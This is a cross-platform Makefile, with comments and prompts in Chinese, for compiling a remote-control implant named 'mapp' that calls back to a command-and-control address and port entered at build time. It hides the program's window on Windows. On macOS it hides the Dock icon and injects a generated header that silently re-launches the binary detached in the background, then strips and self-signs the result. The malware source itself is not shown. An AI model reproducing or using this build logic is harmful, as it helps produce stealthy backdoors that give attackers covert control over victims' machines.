CC = gcc
SRC = main.c
TARGET = mapp
BIN = $(TARGET)


define wininp
ifeq ($(C2_IP),)
C2_IP:=$(shell cmd /v:on /c "set /p X=请输入IP: >con & echo !X!")
endif
ifeq ($(C2_PORT),)
C2_PORT:=$(shell cmd /v:on /c "set /p X=请输入端口: >con & echo !X!")
endif
endef

define uninp
ifeq ($(C2_IP),)
C2_IP := $$(shell sh -c 'read -p "请输入IP: " t; echo $$$$t')
endif
ifeq ($(C2_PORT),)
C2_PORT := $$(shell sh -c 'read -p "请输入端口: " t; echo $$$$t')
endif
endef

all:
ifeq ($(OS),Windows_NT)
	$(eval $(call wininp))
ifeq ($(CC),cl)
	# Windows MSVC
	$(CC) $(SRC) /Fe:$(BIN).exe /Os /MD /DC2_IP="$(C2_IP)" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
else
	# Windows MinGW
	$(CC) $(SRC) -o $(BIN) -Os -s -mwindows -lws2_32 -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
endif

ifeq ($(shell uname -s),Linux)
	$(eval $(call uninp))
	# Linux
	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif

# 修正后的 Darwin 编译逻辑
ifeq ($(shell uname -s),Darwin)
	$(eval $(call uninp))
	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
	
	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
	__attribute__((constructor)) static void init() { \
		if (getenv("ST_ACT")) return; \
		char path[1024]; uint32_t size = sizeof(path); \
		if (_NSGetExecutablePath(path, &size) != 0) return; \
		chdir(dirname(path)); \
		setenv("ST_ACT", "1", 1); \
		char cmd[2048]; \
		sprintf(cmd, "nohup \\"%%s\\" > /dev/null 2>&1 & disown", path); \
		system(cmd); \
		exit(0); \
	}' > stealth_logic.h

	$(CC) $(SRC) -o $(BIN) -Os -include stealth_logic.h -Wl,-sectcreate,__TEXT,__info_plist,temp.plist -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
	@rm -rf stealth_logic.h temp.plist
	@strip $(BIN) 2>/dev/null || true
	@codesign -s - --force $(BIN) 2>/dev/null || true
endif
clean:
ifeq ($(OS),Windows_NT)
	cmd /c erase /f /s /q $(BIN) $(BIN).*
else
	sh -c "rm -rf $(BIN) $(BIN).*"
endif
